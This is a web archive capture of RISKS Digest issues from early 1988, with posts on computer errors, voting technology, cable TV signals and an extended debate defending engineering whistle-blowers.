<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Unusual Computer Risk -- Harem Scarem?
</A>
</H3>
<address>
Mike Bell 
&lt;<A HREF="mailto:mcvax!camcon!mb@uunet.UU.NET">
mcvax!camcon!mb@uunet.UU.NET
</A>&gt;
</address>
<i>

</i><PRE>
Date: 1 Feb 88 13:17:06 GMT

Reproduced from COMPUTER TALK - 1 February 1988

COMPUTER PROGRAM DRIVES ARAB TO SEXUAL EXHAUSTION

A Saudi Arabian millionaire thought he was heading for conjugal bliss when he
had the bright idea of organising his harem by computer.  
  Unfortunately his plan misfired.  Instead of leaving him with the satisfied
smile of a clever Cassanova, Saleh-el-Modiia's rigorous regime left him
completely knackered.  A fact which one of his four wives tearfully related to
a newspaper in the Saudi city of Riyadh.
  "The computer has gone haywire.  It's making Saleh too exhausted...  he just
falls asleep in my arms", she said.
  The computer devised a weekly schedule for the 38-year-old failed Lothario
after he had keyed in his wives ages, birthdays, clothes sizes and medical
details.  The schedule told him who to go to see, what to wear, and what he
was meant to do.
  But even though Modiia's wives are complaining, he refuses to ditch the
computer.  "It's only gone wrong once.  That was when I was in hospital and
all four wives came to visit me at the same time", he said.

Mike Bell  UUCP:  ...!ukc!camcon!mb   or   mb%camcon.uucp    +44 223 358855 
Cambridge Consultants Ltd, Science Park, Milton Road, Cambridge CB4 4DW

   [I saw this a while back, but I don't recall it appearing in RISKS.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Mistaken AIDS warnings
</A>
</H3>
<address>
&lt;<A HREF="mailto:forags@violet.Berkeley.EDU">
forags@violet.Berkeley.EDU
</A>&gt;
</address>
<i>
Tue, 2 Feb 88 08:44:07 PST
</i><PRE>

I heard a report on KCBS this morning that two Berkeley hospitals have
mistakenly sent letters to an unknown number of former patients warning that
they might have been exposed to AIDS through contaminated blood transfusions.
Naturally, attributed to a computer error.

Al Stangenberger                    Dept. of Forestry &amp; Resource Mgt.
forags@violet.berkeley.edu          145 Mulford Hall
uucp:  ucbvax!ucbviolet!forags      Univ. of California
(415) 642-4424                      Berkeley, CA  94720

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Human error vs human error (and bad design)
</A>
</H3>
<address>
&lt;<A HREF="mailto:munnari!ditmela.oz.au!george@uunet.UU.NET">
munnari!ditmela.oz.au!george@uunet.UU.NET
</A>&gt;
</address>
<i>

</i><PRE>
Date: 02 Feb 88 14:06:09 +1100 (Tue)

There is an interesting article in "New Scientist" of 21st January '88
titled "The Zeebrugge-Harrisburg syndrome" which broadly speaking is 
about the crossover between human error and bad design. 

(article by Stephen Pheasant, two extracts without permission):

1. Three Mile Island:

  "...Another example of catastrophic system failure in which ``human error''
  is generally acknowledged to have played a critical role took place at the
  Three Mile Island Unit 2 nuclear reactor .... They thought that the reactor
  was in danger of ``going solid'', that is, overfilling because they were
  unaware that a relief valve was open and that water was flowing out almost
  as quickly as they were pumping it in.  The Status of this indicator
  changed when a control signal was sent to the valve, rather than when the
  valve itself closed.  It was technically easier to do it that way and
  nobody had ever thought the difference would be important."

2. A British Motor Car

    "...basic error-including mechanisms may have consequences which range
  from the catastrophic to the trivial. The Headlamp switch on a certain
  British motor car is mounted on the left hand side of the steering column
  and is pushed for ``on'' contrary to the general stereotype. On leaving the
  vehicle it is easy for the driver to operate this switch accidentally with
  the knee. The worst that can result is a flat battery but in another context
  (such as the cockpit of an aircraft) the accidental operation of a control
  could be catastrophic..."

I'm sure the former item is well known to many (apologies if raised before in
this forum) and I bet there are more examples of "lazy engineering" decisions
having massive consequences.
                                        George Michaelson
ACSnet:	george@ditmela.oz.au
Postal:	CSIRO, 55 Barry St, Carlton, Vic 3053   Phone:	(03) 347 8644 

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Technology Transfer Policy
</A>
</H3>
<address>
Henry Spencer 
&lt;<A HREF="mailto:henry%utzoo.uucp@RELAY.CS.NET">
henry%utzoo.uucp@RELAY.CS.NET
</A>&gt;
</address>
<i>

</i><PRE>
Date: 1 Feb 88 20:09:47 GMT

One negative consequence of the US's attempt to apply its technology-transfer
rules to foreign nationals outside the US is that it makes international
agreements much more difficult.  One of the (several) problems that has been
stalling negotiations on international participation in the space station
is that the US wants its technology-transfer laws to apply to foreign users
of the station as well, and the would-be partner countries find this
outrageous and unacceptable.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Whistle Blowing
</A>
</H3>
<address>
Ronni Rosenberg 
&lt;<A HREF="mailto:ronni@VX.LCS.MIT.EDU">
ronni@VX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Tue, 2 Feb 88 15:02:27 est
</i><PRE>

In response to the recent RISKS article that bashes whistle-blowing (Guthery,
"Blowing Whistles or Blowing Smoke?", RISKS 6.19), I again want to defend
whistle blowing as an ethically responsible -- sometimes ethically required --
action for some engineers in some circumstances.

Guthery writes:  "the very last thing a whistle blower is interested in is
accepting responsibility," a claim that is not supported by the literature on
whistle blowing.  Whistle-blowing engineers typically are responsible for some
aspect of a system's current use, not its original engineering.  In this
sense, they are concerned about problems that others caused; e.g., Roger
Boisjoly did not design the original shuttle O-rings, but he was responsible
to some degree for their effectiveness.  Complex systems are worked on by so
many people, for so long, that the original engineers are likely to be gone by
the time the system begins to be used and a problem arises -- assuming one can
even determine who was responsible for the original work.  Is pointing out a
critical problem in one's area of responsibility, when one becomes aware of
it, really just "pointing my finger at everybody else in sight"?

Guthery's other main point, that "most whistle blowing has to do with how the
papers were shuffled and the most predictable aftereffect of whistle blowing
is still more bureaucracy," also is not supported by the literature.  The
whistle-blowing case studies that I've seen had to do with conscious decision-
making to reject the concerns raised by engineers (as in the Boisjoly case,
where Morton-Thiokol manager appear to have knowingly decided to launch with
unsafe O-rings).  Entrenched bureaucracy clearly is a problem, and most of the
cases I've read about took place in very large organizations, and it is hard
to get things done via bureaucracy.  But like it or not, most engineers work
in large organizations with a lot of money at stake, and you cannot enact
major changes any other way.  The results of whistle-blowing often are not
just paper shuffling; sometimes they are saved lives or safer systems.  Is the
assumption that only papers will be shuffled just a rationalization for
remaining silent when you should speak out?

I couldn't agree more with Guthery's statement that "I don't think we know
enough about building computer systems to build good systems without making
mistakes," but I disagree with his conclusion that we should just be allowed
to make our mistakes, without the annoyance of whistle blowers pointing them
out.  We have the right to make mistakes only if we (1) acknowledge up front
that this is the way we have to work, and (2) do not put a system into use,
particularly in a critical application, if we are not sure that it works.

  (1) Although the RISKS community seems to agree that many mistakes are made
   in any large system, for the most part, the computing "profession" does not
   admit this.  The for-profit part of the industry claims -- through ads,
   sales people, grant proposals -- to deliver systems that work, period.
   But new products/systems are routinely delivered with many important bugs.
   Funders and customers get upset when they see what they really have to go
   through and spend to get a system that works reasonably well.  Sometimes,
   as in the recent bank case, the customer abandons the whole project; you
   can be sure that time for "making mistakes" was not adequately built into
   the bank project.

   (2) Whistle blowers usually act in situations where critical systems are in
   use, don't appear to be working safely, but are alleged to be working fine.
   What gives us the "right" to make mistakes in such situations?  All the
   literature on professional ethics agrees that people with special
   expertise, such as engineers, have a special OBLIGATION to inform and
   educate others, including the general public, about the limits and risks
   of the systems they build.

I am upset to see in the RISKS Forum the standard technological enthusiast's
argument, that people who criticize technology are just Luddites.  Some
critics are more concerned about the uses of technology than engineers, who as
we know can get so wrapped up in the technology that they fail to consider the
people whom the system will effect.  Most whistle-blowers come from inside the
system, are not normally inclined to get involved in nontechnical issues, and
try every internal channel before going public.  We owe them special attention
when they raise problems.

Before condemning whistle blowers because they've criticized a neat system,
I encourage you to read about their cases and view the Boisjoly videotape
(available for rent from CPSR/Boston).  When you read about what they've
suffered as a result of their complaints, and when you hear the anguish in
Boisjoly's words, you may change your mind.  For a good, readable discussion
of engineering ethics, including several case studies of whistle-blowing, read
Stephen H. Unger, CONTROLLING TECHNOLOGY: ETHICS AND THE RESPONSIBLE ENGINEER
(New York: Holt, Rinehart and Winston, 1982).

     [The response here was almost unprecedented, indicating significant
     interest in the topic.  Yes, the following messages contain MUCH
     overlap.  However, in this case let me try not to reject or edit,
     and let the discussion speak for itself.  You may skip the rest of 
     the issue if you have had enough.  PGN]

</PRE>
<HR><H3><A NAME="subj5.2">
Re: Blowing Whistles or Blowing Smoke?  [<A HREF="/Risks/6.19.html">RISKS-6.19</A>]
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 02 Feb 88 11:04:01 -0500
From: dan@WILMA.BBN.COM

I find Guthery's reaction to whistleblowing bizarre.  In none of the
whistle-blowing cases I've read about (including the ones in Nancy Leveson's
article) did the whistle-blowers immediately run to a phone and call the
Times as soon as they found anything wrong.  They tried to straighten it out
with their superiors.  Unfortunately, their superiors were part of the
problem! Guthery provides no advice for what to do in that case.

In Roger Boisjoly's case, not only his immediate superiors but several layers
of management above that simply didn't want to hear what he had to say.

In Sylvia Robins's case, she was FIRED.  How on earth could she stay and fix
the problem then?  I think her response--going to the NASA inspector general
and the FBI--was entirely appropriate.  If she had immediately called the New
York Times, perhaps Guthery would have a case, but she didn't; she went
through what appropriate channels were left to her.

As Nancy Leveson's article showed, whistleblowers DO accept personal
responsibility for the quality of their work--and when their management makes
it impossible to turn out work that meets safety standards, they do their best
to get their management overruled.  That will often entail contacting channels
outside the company.
                                      	Dan Franklin

</PRE>
<HR><H3><A NAME="subj5.3">
The motivation behind whistle-blowing
</A>
</H3>
<address>
&lt;<A HREF="mailto:jik@ATHENA.MIT.EDU">
jik@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Tue, 2 Feb 88 12:55:43 EST
</i><PRE>
Re: guthery%asc@sdr.slb.com in RISKS 6.19

I cannot agree with the claim that, "What a whistle blower is saying to me is,
`Something is wrong here and rather than fix it and risk being held even
partially responsible, I'll make sure I'm perceived as being wholly blameless
by being a really Good Person and blowing this whistle and pointing my finger
at everybody else in sight.'"

Instead, I think it might be more correct as follows: "What a whistle blower
is saying is, `I have found something wrong with my organization.  I have
tried to remedy the situation through the proper channels, but I have been
rebuffed and impeded every step along the way.  The only way, therefore, to
solve the problem is to step outside of the proper channels and to blow the
whistle on the improprieties that are being propogated.'"

Roger Boisjoly, the Morton Thiokol engineer who attempted to prevent the
January 1986 Challenger launch, is an excellent example of the second type of
whistle-blower.  He realized that there was a problem and he did everything
within his power both to bring the problem out into the open and to accept
responsibility for remedying the situation.  When his efforts were thwarted,
he chose to go outside of normal channels and jeapordize his job.

-- Jonathan Kamens   |   jik@ATHENA.MIT.EDU

</PRE>
<HR><H3><A NAME="subj5.4">
us rationals, them luddites
</A>
</H3>
<address>
&lt;<A HREF="mailto:Agre@AI.AI.MIT.EDU">
Agre@AI.AI.MIT.EDU
</A>&gt;
</address>
<i>
Mon, 1 Feb 88 21:48 CST
</i><PRE>

Can you think of any cases of `whistle-blowers' who had actually had it in
their power to fix the problems they were complaining about?  Almost always
they had spent a lot of time trying to go through channels before taking the
great personal risk of going public.  Almost always they encountered
indifference or cowardice or mendacity among the `teams' within which they
were supposed to be `players'.  Besides, someone who blew a whistle on
something they had the ability to fix would look pretty silly, wouldn't they?

Do whistle blowers complain about `mistakes'?  No.  Most often they complain
about lies.  Falsification of test data.  Systematic suppression of contrary
evidence.  People who design and implement and approve and release systems
that they know will not work, that they know will be impossibly expensive to
maintain, that they know will be dangerous.  Are these things inherent in
large organizations?  If so then we have some hard thinking to do.

Phil Agre

</PRE>
<HR><H3><A NAME="subj5.5">
Re:  RISKS DIGEST 6.19  Who's really blowing smoke?
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@ames-aurora.arpa">
steve@ames-aurora.arpa
</A>&gt;
</address>
<i>
Tue, 2 Feb 88 12:31:26 PST
</i><PRE>

   In a Risks digest on Monday, Feb 1,"guthery%asc@sdr.slb.com" puts forth
several ideas on "whistle blowers" that demand to be challenged.  Guthery
states that whistle-blowers are not interested in accepting responsibility.

   Case histories of whistle-blowers show this not to be the case. Many
such people expended a large amount of effort within thier organizations
working through normal channels to have problems corrected.  It is only 
after such attempts fail that these people have "gone public" or leak
information to appropriate agencies.  The personal risk these people take
is very high -- they risk loss of their jobs and financial security
because they feel a moral imperative to right a wrong.  These are exactly
the kind of people I'd trust with my security.  Even before they went
outside of their organizations, these people were fired, harrassed, and 
threatened with death or harm to thier families.  In it unecessary to 
cite cases here -- anyone who reads has seen enough of these to know 
that at least some of them are real.  

   Guthery further argues that the only outcome of whistle-blowing activity
is to create more paper work, which produces no gain because bureaucracies 
have no positive effect.  If this is true, why not abolish all rules and 
laws?  This line of reasoning is faulty.  Problems in our systems and 
companies must be exposed to view and be corrected.  Legal means are but 
one mechanism.  Public outcry is sometimes enough in and of itself as 
companies are concerned with public image (and its effect on profits).  

  If we do not protect those who seek to protect us, then we are in
complicity with the wrongdoers.  If we allow the whistle blowers to
be harrassed and injured, then we are as guilty of the crimes they
expose as those who commit them.  It seems to me that it is not 
the whistle blowers who are blowing smoke, but rather it is Guthery. 

					Steven Philipson, NASA/Ames

</PRE>
<HR><H3><A NAME="subj5.6">
Smoke and Whistles, guthery, risks 6.19 
</A>
</H3>
<address>
Frank Houston
&lt;<A HREF="mailto:houston@nrl-csr.arpa ">
houston@nrl-csr.arpa 
</A>&gt;
</address>
<i>
Tue, 2 Feb 88 13:06:34 est
</i><PRE>

This may be a "flame", but since the subject is smoke, I decided to send it 
anyhow.  I could not let guthery's comments about whistle blowers pass.

What is whistle-blowing, anyway.  I suggest that it assumes various forms, the 
most extreme being either calling reporters to disclose shortcuts that slight 
safety in favor of schedule or privately informing a customer of potential 
problems that are being ignored in your company's product or service.

  &lt;... In other words, encouraging whistle-blowing provides a DISINCENTIVE to&gt;
  &lt;the acceptance of personal responsibility and accountability.  ...        &gt;

Not a completely fair generalization, I think.  Ponder for just a moment
what "accepting personal and financial responsibility" means to most
individuals.  Despite "legal safeguards" a whistle-blower has very little
effective protection and stands a very good chance to lose both income in
the short term and career in the long run.  I suggest that the disincentives
to whistle-blowing far outweigh any negative effects on personal
accountability.

Moreover, the whistle-blower may not be in a position to solve the problems
in question.  There may not be a solution, or the solution may conflict with
other corporate, governmental or political objectives.  Sure, the ideal way
to address a problem is just to solve it quietly, but when the solution
requires unbudgeted resources or time, the bureaucrats will balk.  Then the
responsible, ethical person has a difficult decision, namely, whether the
problem is significant enough to warrant risking both livelihood and career
by blowing the whistle.

   &lt;Do you want to risk your family's financial security to a guy who's going&gt;
   &lt;to start lobbing fault grenades at the first sign of difficulty or       &gt;
   &lt;something unexpected?                                                    &gt;

I don't think most guys are going to risk their own financial security by 
lobbing fault grenades at the first sign of problems.

    &lt;...and the most predictable aftereffect [Sic] of whistle-blowing is still&gt;
    &lt;more bureaucracy. ... And anyone who thinks that bureaucracies build     &gt;
    &lt;safe, reliable compuer [Sic] systems should visit the Social Security    &gt;
    &lt;Administration's data processing center or their favorite nuclear reactor&gt;
    &lt;project.                                                                 &gt;

The truth hurts, and I believe this is truth.  If anything should be a major
disincentive to whistle-blowing, it is humanity's persistent dream that laws
and regulations and more "controls" (usually meaning six more approval
signatures, minimum) can solve problems.  If we can believe TIME, Feb. 1,
1988, NASA's safety bureaucracy does not seem to have prevented their
contractors from slipping some fairly obvious problems through the system.
When economic incentives conflict with human values, the outcome is fairly
predictable no matter how many or how strong the countervailing controls,
regulations or laws may be.  The most painful result of bureaucracy is the
addition of significant costs (both to provide review and to cope with it)
for little or no appreciable affect on the problems.

    &lt;Indeed, it is exactly the process of making mistakes that will teach us  &gt;
    &lt;how to build good ones [computer systems] and avoid building bad ones.   &gt;
    &lt;whistle-blowers would deny us this learning and condem [Sic] us to       &gt;
    &lt;building with our current and quite incomplete state of knowledge.  In   &gt;
    &lt;the main, they are 20th century Luddites blowing smoke not whistles.     &gt;

Making mistakes can be excused; repeating them should not.  Hiding mistakes
should be condemned.  Whistle-blowers can insure that mistakes are neither
hidden nor forgotten, thus helping insure that they are not repeated.  It
seems that computer scientists, or whatever you call these professionals,
have plenty of mistakes from which to learn.  I suggest that the so-called
20th century Luddites may be motivated by a desire to force the professions
to learn from their collective and individual mistakes, and that, I submit,
is more substantial than smoke.

I was very appreciative of the comment that appeared somewhere in the same 
number, "Every six months computer science loses its memory (if not its mind)." 
Seems appropriate to repeat at this point.

Frank Houston   FDA, CDRH  (houston@nrl-csr.arpa)
Disclaimer:  The views presented above are those of the author alone and do
not represent policies of either the FDA or the CDRH.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Virus anxiety expressed in NY TIMES (RISKS DIGEST 6.19)
</A>
</H3>
<address>
Amos Shapir
&lt;<A HREF="mailto:nsc!taux01!taux01.UUCP!amos@Sun.COM ">
nsc!taux01!taux01.UUCP!amos@Sun.COM 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 2 Feb 88 15:05:53 GMT
Hdate: 14 Shvat 5748

jon@june.cs.washington.edu (Jon Jacky) writes:
&gt;May 13 will be the 40th anniversary of the last day Palestine existed as a 
&gt;political entity; Israel declared its independence on May 14, 1948. ...
&gt;Israeli officials suggested a "Friday the 13th" coincidence, but Mr. Rakavy
&gt;said the virus was coded to ignore Nov. 13, 1987."

Israel celebrates holidays according to the Jewish calendar; this year's
independence day falls 3 weeks before May 13. I suspect November 13 was
ignored just to let the virus more time to spread. (Note that this give us
a clue to the time the virus was initiated).

Amos Shapir National Semiconductor (Israel)           amos%taux01@nsc.com
6 Maskit st. P.O.B. 3007, Herzlia 46104, Israel       Tel. +972 52 522261

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.19.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.21.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-57</DOCNO>
<DOCOLDNO>IA012-000130-B024-124</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.21.html 128.240.150.127 19970217015458 text/html 21434
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:53:23 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 21</TITLE>
<LINK REL="Prev" HREF="/Risks/6.20.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.22.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.20.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.22.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 21</H1>
<H2> Saturday, 6 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Delta Air Lines "Computer" Mistake 
</A>
<DD>
<A HREF="#subj1.1">
Chris McDonald
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Missouri Voting Decision 
</A>
<DD>
<A HREF="#subj2.1">
Charles Youman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Whistle-blowing 
</A>
<DD>
<A HREF="#subj3.1">
Bob Ayers
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: RISKS in Cable TV? 
</A>
<DD>
<A HREF="#subj4.1">
Svante Lindahl
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Time base on cable TV info 
</A>
<DD>
<A HREF="#subj5.1">
Kekatos
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Signals on power lines 
</A>
<DD>
<A HREF="#subj6.1">
Peter da Silva
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  The risk of LOJACK 
</A>
<DD>
<A HREF="#subj7.1">
Johnathan Vail
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Risks of helpful news software 
</A>
<DD>
<A HREF="#subj8.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  "My country's misguided technology transfer policy" 
</A>
<DD>
<A HREF="#subj9.1">
Hugh Davies
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Delta Air Lines "Computer" Mistake
</A>
</H3>
<address>
Chris McDonald  STEWS-SD 678-2814 
&lt;<A HREF="mailto:cmcdonal@wsmr10.ARPA">
cmcdonal@wsmr10.ARPA
</A>&gt;
</address>
<i>
Wed, 3 Feb 88  7:28:19 MST
</i><PRE>

Last week the news media reported that Delta Air Lines had determined that its
"computer" had erroneously issued 750 frequent-flier certificates for free or
reduced fare flights to individuals who had not earned them.  A Delta spokesman
stated that "we know who these people are" and that the certificates would not
be honored.  It was also revealed that 3,000 other frequent fliers, who should
have received credits, had not.

This week Delta reversed its decision.  It will now honor the "unearned"
certificates.  Apparently 200 people will receive a free trip anywhere in the
USA; an additional 550 people will be able to fly for 50% off when a companion
buys a full-fare ticket.  The cost of the "error" will not be known until
individuals redeem the certificates.  All individuals, who should have
received credits, have similarly received their just due, according to Jim
Lundy from Delta.

I wonder who ultimately pays for Delta's decision.  On the assumption that
Delta officials feel confident the "error" was unintentional and not a
deliberate act by--dare I say--an insider, may we not adopt the maxim "computer
errors do pay!"

Chris McDonald, White Sands Missile Range

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Missouri Voting Decision
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 04 Feb 88 08:51:29 EST
From: Charles Youman (youman@mitre.arpa) &lt;m14817@mitre.arpa&gt;

The January 1, 1988 edition of the St. Louis Post Dispatch contained
a follow up article on the Missouri voting decision previously reported
in RISKS 6:4.  The article by Tim Poor is titled "Blunt Says Ruling
Could Make Punch-Card Voting 'Unworkable'", appears on page 9A and is
quoted without permission:

"Missouri Secretary of State Roy Blunt said Thursday that a recent federal
court decision could 'make punch-card voting unworkable' and delay the
results of statewide elections.

Blunt called the ruling by U.S. District Judge William L. Hungate 'unfair'
because it requires a manual review of ballots on which some votes have
gone uncounted by St. Louis' automatic tabulating equipment.

He said as many as 60,000 ballots--half of all cast--might have to be
counted by hand because of the ruling. . . .

Hungate said the board's failure to review the ballots violated the 
Federal Voting Rights Act.  In addition to the manual review, he told the
board to target for voter education those wards from which more than 5
percent of the ballots were uncounted. . . .

Blunt said he agreed with the board's position that a manual review of
ballots on which some votes were uncast would be unworkable.  There would
be too many ballots to review; on lengthy ballots, many voters skip some
issues, he said.

The ruling 'encourages voters to vote on things they're not interested in,'
Blunt said.  He explained that people might vote on all items on the ballot
if they think that their ballot will be manually inspected if they don't. . . .

And he questioned the ability of election officials to determine for whom
a voter wanted to vote on ballots that are uncounted because they are
improperly punched.

'Engaging in speculation by looking at scratch marks, indentions or double
punches requires guessing as to what the voter is thinking,' he said.
'No group of election workers is qualified to do that.'"

There appears to be two distinct categories of votes that are not being
counted (1) those with the "scratch marks, indentions or double punches"
and (2) those that the voter didn't vote on every issue.  It's difficult
to tell from the article how many fall into category (1) and how many fall
into category (2).  I would not expect a computer program to be able to
make the judgements needed to deal with those in (1).  On the other hand,
if a substantial number of votes are in category (1) something is seriously
wrong with the overall system design that causes voters to make this error.
I see no reason why a computer program couldn't accurately count those
votes that fall into category (2).  In fact, I would go further and say 
that a program that makes that kind of error should not be allowed to be
used.  Perhaps legislation to that effect is in order.

It also appears that the judge was willing to accept a 5% rate of uncounted
votes. A lot--A LOT!--of elections are decided by less than 5% of the vote.

I'm not sure how votes in category (1) are dealt with in a manual system.
Is the entire ballot voided or are only those issues where the voter's 
intent is not clear?

It also appears that there need to be extensive procedural controls to
prevent someone from voiding ballots by making additional punches after
the vote is cast.  You could void all the votes that didn't go the way
you wanted them to.  Does this mean that a checksum needs to be computed
and punched into the ballot at the time it is cast?
                                                       Charles Youman

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Whistle-blowing (<A HREF="/Risks/6.20.html">RISKS-6.20</A>)
</A>
</H3>
<address>
Bob Ayers
&lt;<A HREF="mailto:ayers@src.dec.com ">
ayers@src.dec.com 
</A>&gt;
</address>
<i>
Wed, 3 Feb 88 12:34:05 pst
</i><PRE>

In Risks 6.20, Ronni Rosenberg (in a whistle-blowing discussion) remarks that

  We have the right to make mistakes only if we (1) acknowledge up front
  that this is the way we have to work, and (2) do not put a [computer]
  system into use, particularly in a critical application, if we are not 
  sure that it works.

What does "sure that it works" mean here?  If it means "certain that it
meets the specifications and never delivers anomolous results" then I
have to admit that I've never met such a computer system.

It is partly an issue of comparative risk -- something that other posters
have previously mentioned. Is it better to have a computerized system --
knowing that it is not perfect -- or to have a non-computerized system --
which also will not be perfect, though its faults will be different?

Would you use a computer system if, on each use, it had a one in 10^9 chance
of killing you?  You use such [non-computer] systems every day.  I recommend
the book (also mentioned before) On Acceptable Risk.
                                                            Bob

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: RISKS in Cable TV?
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Fri, 05 Feb 88 03:33:12 +0100
From: Svante Lindahl &lt;zap@nada.kth.se&gt;

In RISKS 6.18 marty moore &lt;MOOREMJ@aim.rutgers.edu&gt; writes:
&gt;I always thought this had great possibilities for unscrupulous TV station
&gt;programmers.  ("Let's buy some commercials through a dummy on the other 
&gt;stations...we'll bury the signal to change to our stations in the commercials.
&gt;The audience will never know the difference.")

The Swedish televion monopoly shut down their slave transmitters by
sending a short series of beeps from the masters. This signal is heard
from the TV just before the screen gets blurred.

A few years ago a news program showed a film displaying a televion set
filmed just when the broadcasts where terminating for the night.
The beeps were sent out in the middle of the news broadcast from this
"recursively" shown TV-set. This caused all transmitters to turn off
this station nationwide right in the middle of prime time news...

I believe this has been fixed so that the same mistake wouln't
happen again.
                            Svante Lindahl		zap@nada.kth.se

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Time base on cable TV info
</A>
</H3>
<address>
Kekatos
&lt;<A HREF="mailto:moss!ihuxv!tedk@rutgers.edu ">
moss!ihuxv!tedk@rutgers.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 3 Feb 88 22:01:03 GMT
Organization: AT&amp;T Bell Laboratories - Naperville, Illinois

Re: (The second of) Two recent stories with lessons to be learned 
    (Rich Kulawiec) [<A HREF="/Risks/6.17.html">RISKS-6.17</A>]

The time (and date) info is digital encoded into the "back-porch"
of the TV signal of an "un-used" or "local cable guide" channel. I think
the "control" packets for the boxes are also sent via the wasted bandwidth
of an "un-used" or "local cable guide" channel.
